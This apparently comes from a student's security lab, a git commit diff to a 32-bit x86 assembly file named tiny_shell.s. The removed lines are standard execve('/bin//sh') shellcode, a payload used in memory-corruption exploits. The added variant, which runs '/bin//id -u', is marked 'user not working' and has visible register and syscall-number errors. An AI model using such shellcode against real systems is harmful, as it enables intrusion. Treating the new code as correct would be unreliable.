f7cb2c487356b32e72264811647da22d1d810ffc
Alex Molodyh <amolodyh16@mail.wou.edu>
2017-10-29 18:59:07 -0400

    user not working

--- Week6/lab2/homework/tiny_shell.s
+++ Week6/lab2/homework/tiny_shell.s
@@ -1,15 +1,30 @@
 BITS 32
 
+section .text
+global _start
+
+_start:
 ; execve(const char *filename, char *const argv [], char *const envp[])
   xor eax, eax      ; zero our eax
+
+  push eax	    ; push some nulls for string termination
+  push 0x752d	    ; push "-u" to the stack
+  mov ebx, esp	    ; put address of "-u" into ebx from esp(stack)
+
   push eax          ; push some nulls for string termination
-  push 0x68732f2f   ; push "//sh" to the stack
+  push 0x64692f2f   ; push "//id" to the stack
   push 0x6e69622f   ; push "/bin" to the stack
-  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
-  push eax          ; push 32-bit null terminator to stack
-  mov edx, esp      ; this is an empty array for envp
-  push ebx          ; push string addr to stack above null terminator
-  mov ecx, esp      ; this is the argv array with string ptr
+  mov eax, esp      ; put the address of "/bin//id" into ecx, via esp
+  
+  push eax
+  push ecx
+  push ebx	    ; push ebx onto the stack
+  push eax
+
+  mov ebx, eax      ; move "bin/id" prt to ebx
+  mov ecx, esp
+  xor edx, edx
+
   mov al, 11        ; syscall #11
   int 0x80          ; do it
-
+  ret
